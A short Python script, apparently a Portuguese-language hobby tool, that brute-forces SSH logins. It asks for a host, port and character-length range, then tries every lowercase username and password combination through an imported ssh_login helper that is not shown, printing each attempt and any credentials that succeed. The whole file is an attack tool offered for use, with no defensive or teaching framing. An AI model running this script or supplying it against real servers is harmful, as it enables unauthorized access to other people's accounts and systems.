from functions import generate_combinations, ssh_login

colors = {
    'purple': '\033[95m',
    'cyan': '\033[96m',
    'darkcyan': '\033[36m',
    'blue': '\033[94m',
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'bold': '\033[1m',
    'underline': '\033[4m',
    'end': '\033[0m'
}

if __name__ == "__main__":
    host = input("HOST: ")
    port = input("PORTA: ")
    max_length = int(input("QUANTIDADE MÁXIMA DE CARACTERES: "))
    min_length = int(input("QUANTIDADE MÍNIMA DE CARACTERES: "))

    characters = r"abcdefghijklmnopqrstuvwxyz"

    print(f"\n{colors['red']}ATACANDO...{colors['end']}")
    count = 0
    for x in generate_combinations(characters, min_length, max_length):
        username = x
        for y in generate_combinations(characters, min_length, max_length):
            password = y
            print(f"\n{colors['yellow']}TENTANDO:{colors['end']}")
            print(f"Usuário >> {username}")
            print(f"Senha >> {password}")
            if ssh_login(host, port, username, password):
                print(f"\n{colors['green']}ENCONTRADO:{colors['end']}")
                print(f"Usuário >> {username}")
                print(f"Senha >> {password}")
                count += 1
            else:
                count += 1
    print(f"\nN° TENTATIVAS: {count}")
